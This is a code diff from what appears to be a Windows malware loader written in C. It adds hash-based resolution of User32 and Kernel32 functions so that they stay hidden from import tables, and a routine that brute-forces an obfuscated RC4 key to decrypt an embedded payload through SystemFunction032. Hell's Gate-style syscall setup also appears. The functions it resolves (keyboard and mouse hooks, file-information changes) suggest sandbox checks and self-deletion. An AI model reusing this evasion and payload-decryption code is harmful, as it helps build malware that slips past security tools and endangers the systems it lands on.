@@ -52,8 +52,78 @@ BOOL InitializeSyscalls() {
 	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtDelayExecution))
 		return FALSE;
 
-	if (!ApiHashing())
+	return TRUE;
+}
+
+API_HASHING g_Api = { 0 };
+
+BOOL ApiHashing() {
+
+	//	User32.dll exported
+	g_Api.pCallNextHookEx = (fnCallNextHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), CallNextHookEx_JOAA);
+	g_Api.pDefWindowProcW = (fnDefWindowProcW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), DefWindowProcW_JOAA);
+	g_Api.pGetMessageW = (fnGetMessageW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), GetMessageW_JOAA);
+	g_Api.pSetWindowsHookExW = (fnSetWindowsHookExW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), SetWindowsHookExW_JOAA);
+	g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), UnhookWindowsHookEx_JOAA);
+
+	if (g_Api.pCallNextHookEx == NULL || g_Api.pDefWindowProcW == NULL || g_Api.pGetMessageW == NULL || g_Api.pSetWindowsHookExW == NULL || g_Api.pUnhookWindowsHookEx == NULL)
 		return FALSE;
+
+	// 	Kernel32.dll exported
+	g_Api.pGetModuleFileNameW = (fnGetModuleFileNameW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetModuleFileNameW_JOAA);
+	g_Api.pCloseHandle = (fnCloseHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CloseHandle_JOAA);
+	g_Api.pCreateFileW = (fnCreateFileW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CreateFileW_JOAA);
+	g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetTickCount64_JOAA);
+	g_Api.pOpenProcess = (fnOpenProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), OpenProcess_JOAA);
+	g_Api.pSetFileInformationByHandle = (fnSetFileInformationByHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), SetFileInformationByHandle_JOAA);
+
+	if (g_Api.pGetModuleFileNameW == NULL || g_Api.pCloseHandle == NULL || g_Api.pCreateFileW == NULL || g_Api.pGetTickCount64 == NULL || g_Api.pOpenProcess == NULL || g_Api.pSetFileInformationByHandle == NULL)
+		return FALSE;
+
+	return TRUE;
+}
+
+BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
+
+	// The return of SystemFunction032
+	NTSTATUS        	STATUS = NULL;
+	BYTE			RealKey[KEY_SIZE] = { 0 };
+	int			    b = 0;
+
+	// Brute forcing the key:
+	while (1) {
+		// Using the hint byte, if this is equal, then we found the 'b' value needed to decrypt the key
+		if (((pRc4Key[0] ^ b) - 0) == HINT_BYTE)
+			break;
+		// Else, increment 'b' and try again
+		else
+			b++;
+	}
+
+#if DEBUG
+	PRINTA("[i] Calculated 'b' to be : 0x%0.2X \n", b);
+#endif
+
+	// Decrypting the key
+	for (int i = 0; i < KEY_SIZE; i++) {
+		RealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);
+	}
+
+	// Making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
+	USTRING         Key = { .Buffer = RealKey,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
+		Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };
+
+	// Since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the process,
+	// And using its return as the hModule parameter in GetProcAddress
+	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryA("Cryptsp"), SystemFunction032_JOAA);
+
+	// If SystemFunction032 calls failed it will return non zero value
+	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
+#if DEBUG
+		PRINTA("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
+#endif
+		return FALSE;
+	}
 
 	return TRUE;
 }
